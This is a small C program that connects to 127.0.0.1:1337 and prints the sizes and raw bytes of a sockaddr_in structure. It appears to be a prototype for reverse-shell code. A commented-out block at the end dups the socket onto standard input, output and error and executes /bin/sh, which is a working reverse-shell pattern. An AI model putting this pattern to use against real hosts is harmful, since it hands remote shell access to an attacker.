#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


int main(int argc, char* argv[]){
	int sock = 1111;
	int pid,  i, tmp;
	struct sockaddr_in serv_addr;
    char* c = (char*) &serv_addr;

    memset(&serv_addr, '0', sizeof(serv_addr)); 


    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    printf("%d\n",connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)));

    printf("total %d \n",sizeof(serv_addr));
    printf("addr %d \n",sizeof((serv_addr.sin_addr)));
    printf("sock %d \n",sizeof(serv_addr.sin_port));
    printf("family %d \n",sizeof(serv_addr.sin_family));
    


    fflush(0);

    for (i=0; i<=15 ; i++){
        tmp = c[i];
        printf("%d ",tmp);
    }
    printf("\n");


}
/*
    dup2(sock , 0);
    dup2(sock , 1);
    dup2(sock , 2);

    pid = fork();

	if (pid==0){
		execv("/bin/sh",argv);
	}
	
	exit(0);
} */